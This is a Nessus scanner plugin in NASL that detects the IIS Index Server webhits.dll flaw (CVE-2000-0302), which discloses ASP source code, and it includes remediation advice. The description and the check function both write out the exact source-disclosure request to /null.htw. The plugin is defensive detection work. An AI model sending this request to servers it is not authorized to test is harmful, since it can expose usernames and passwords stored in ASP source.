#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10356);
 script_version ("$Revision: 1.18 $");
 script_bugtraq_id(1084);
 script_cve_id("CVE-2000-0302", "CVE-2000-0097");
 
 
 name["english"] = "Microsoft's Index server reveals ASP source code";
 name["francais"] = "L'index serveur de Microsoft donne la source des fichiers asp";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to get the source code of
ASP scripts by issuing the following request :

GET /null.htw?CiWebHitsFile=/default.asp%20&CiRestriction=none&CiHiliteType=Full

ASP source codes usually contain sensitive information such
as usernames and passwords.

Solution : If you need the functionality provided by
WebHits, then install the patch available at :
http://www.microsoft.com/technet/security/bulletin/ms00-006.asp
	
If you do not need this functionality, then unmap the
.htw extensions from webhits.dll using the Internet
Service Manager MMC snap-in.

Risk factor : Serious";
	
 desc["francais"] = "
Il est possible d'obtenir le code source des fichiers
ASP distants en faisant la requete :

GET /null.htw?CiWebHitsFile=/default.asp%20&CiRestriction=none&CiHiliteType=Full


Les codes sources ASP contiennent souvent des informations
sensibles telles que des logins et des mots de passe.

Solution : si vous avez besoin des fonctionnalités
apportées par WebHits, alors installez le patch
disponible à :
http://www.microsoft.com/technet/security/bulletin/ms00-006.asp

Sinon, alors déliez les extensions .htw de webhits.dll au
travers du snap-in Internet Service Manager MMC.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for a problem in webhits.dll";
 summary["francais"] = "Vérifie la présence d'un problème dans webhits.dll";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/iis");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

function check(file)
{
 soc = http_open_socket(port);
 if(soc)
 {
  req = http_get(item:string("/null.htw?CiWebHitsFile=", file, "%20&CiRestriction=none&CiHiliteType=Full"),
	 	port:port);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  r = tolower(r);
  http_close_socket(soc);
  if("&lt;html&gt;" >< r){
  	security_hole(port);
	exit(0);
	}
 }
 else 
  exit(0);
 return(0);
}

port = get_kb_item("Services/www");
if(!port)port = 80;
if(get_port_state(port))
{
 check(file:"/default.asp");
 files = get_kb_list(string("www/", port, "/content/extensions/asp"));
 if(isnull(files))exit(0);
 files = make_list(files);
 check(file:files[0]);
}
